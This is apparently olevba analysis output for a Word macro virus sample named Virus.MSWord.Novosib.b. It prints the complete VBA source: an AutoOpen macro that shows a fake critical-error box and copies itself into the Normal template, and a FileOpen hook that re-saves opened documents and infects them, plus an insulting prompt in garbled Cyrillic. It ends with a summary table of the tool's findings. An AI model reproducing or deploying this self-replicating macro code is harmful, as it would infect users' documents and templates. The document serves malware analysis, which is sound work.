olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Novosib.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Novosib.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Novosib.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim rus
Dim j, Response, Msg, Style
Dim i
Style = vbCritical
Msg = "Ïðîèçîøëà êðèòè÷åñêàÿ îøèáêà.Ïåðåçàïóñòèòå ïðèëîæåíèå. "
On Error GoTo -1: On Error GoTo fail
rus = 0
j = WordBasic.CountMacros(0, 0)
For i = 1 To j
 If WordBasic.[MacroName$](i, 0, 0) = "Fantom" Then rus = 1
Next i

If rus = 1 Then GoTo fail

Response = MsgBox(Msg, Style)

WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal:AutoOp"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Fantom", "Normal:Fantom"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Fuck", "Normal:FileOpen"
fail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Fantom.bas 
in file: Virus.MSWord.Novosib.b - OLE stream: 'Macros/VBA/Fantom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'Ïîñâåùàåòñÿ Èãîðþ Äàíèëîâó
'Çëîáíûé âèðóñîïèñàòåëü èç Íîâîñèáèðñêà
End Sub
-------------------------------------------------------------------------------
VBA MACRO Fuck.bas 
in file: Virus.MSWord.Novosib.b - OLE stream: 'Macros/VBA/Fuck'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Novosib
Dim Virus
Dim Msg, Msb, Msa, Style, MyString, Response
Dim Kota
Dim Mordov
Dim i
Dim zuko
Style = vbYesNo + DefaultButton2
Msg = "Ñäà¸òñÿ ìíå ÷òî âû ìóäàê áàòåíüêà?"
Msa = "Çðÿ âû áàòåíüêà òàêîãî âûñîêîãî ìíåíèÿ î ñåáå!"
Msb = "Âîò òóò ÿ ñ âàìè ïîëíîñòüþ ñîãëàñåí!"
' this macro loaded in normal template as FileOpen
Virus = "Fuck"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo fail
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
Response = MsgBox(Msg, Style)
If Response = vbYes Then
MyString = "Äà"
Response = MsgBox(Msb)
GoTo fol
Else
MyString = "Íåò"
Response = MsgBox(Msa)
fol:
Kota = 0
Mordov = WordBasic.CountMacros(1, 0, 0)
For i = 1 To Mordov
 zuko = WordBasic.[MacroName$](i, 1)
 If zuko = "Fantom" Then Kota = 1
Next i
If Kota = 1 Then GoTo fail
WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
WordBasic.MacroCopy "Normal:AutoOp", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Normal:Fantom", WordBasic.[FileName$]() + ":Fantom"
WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[FileName$]() + ":Fuck"
fail:
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

